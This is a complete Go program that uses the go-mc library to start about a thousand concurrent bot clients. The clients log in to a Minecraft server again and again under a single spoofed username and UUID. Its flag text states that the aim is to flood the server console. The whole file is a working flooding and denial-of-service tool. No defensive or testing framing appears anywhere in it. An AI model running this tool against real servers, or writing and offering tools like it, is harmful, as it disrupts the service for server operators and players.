package main

import (
	"flag"
	"log"
	"time"

	"github.com/Tnze/go-mc/bot"
	"github.com/Tnze/go-mc/bot/basic"
	"github.com/Tnze/go-mc/chat"
)

var (
	address  = flag.String("address", "127.0.0.1", "The server address")
	username = flag.String("username", "TheFifthColumn", "Username to flood console with")
	uuid     = flag.String("uuid", "ed6a50a4-1104-41cf-b81a-7b98c6297b5f", "UUID of username (1.19.2 specific)")
	protocol = flag.Int("protocol", 763, "The server's protocol version")
	number   = flag.Int("number", 1023, "The number of clients")
	pause    = flag.Int("pause", 5000, "Milliseconds each thread waits before trying to login again")
)

func main() {
	flag.Parse()

	for i := 0; i < *number; i++ {
		go func(i int) {
			for {
				ind := newIndividual(i, *username)
				ind.run(*address, *protocol)
				time.Sleep(time.Duration(*pause * 1_000_000))
			}
		}(i)
	}
	select {}
}

type individual struct {
	id     int
	client *bot.Client
	player *basic.Player
}

func newIndividual(id int, name string) (i *individual) {
	i = new(individual)
	i.id = id
	i.client = bot.NewClient()
	i.client.Auth.Name = name
	i.client.Auth.UUID = *uuid
	i.player = basic.NewPlayer(i.client, basic.DefaultSettings, basic.EventsListener{
		GameStart:  i.onGameStart,
		Disconnect: onDisconnect,
	})
	return
}

func (i *individual) run(address string, protocolVersion int) {
	// Login
	err := i.client.JoinServer(address, protocolVersion)
	if err != nil {
		log.Printf("[%d]Login fail: %v", i.id, err)
		return
	}
	defer i.client.Close()
	log.Printf("[%d]Login success", i.id)

	// JoinGame
	if err = i.client.HandleGame(); err == nil {
		panic("HandleGame never return nil")
	}
	log.Printf("[%d] Handle game error: %v", i.id, err)
}

func (i *individual) onGameStart() error {
	log.Printf("[%d]Game start", i.id)
	return nil
}

type DisconnectErr struct {
	Reason chat.Message
}

func (d DisconnectErr) Error() string {
	return "disconnect: " + d.Reason.ClearString()
}

func onDisconnect(reason chat.Message) error {
	return DisconnectErr{Reason: reason}
}
